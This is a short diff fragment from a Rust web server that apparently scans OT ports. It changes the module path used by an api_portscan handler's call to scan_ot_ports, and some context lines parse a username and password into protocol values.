             let ioa: u32 = username.trim().parse().unwrap_or(1);
             let state: u8 = match password.trim().to_ascii_lowercase().as_str() {
@@ -1972,7 +1972,7 @@ async fn api_portscan(
     let mut extra_ports = req.extra_ports;
     extra_ports.truncate(100);
     let result = tokio::task::spawn_blocking(move || {
-        crate::core::portscan::scan_ot_ports(&req.ip, timeout, &extra_ports)
+        casket::core::portscan::scan_ot_ports(&req.ip, timeout, &extra_ports)
     })
     .await;
 
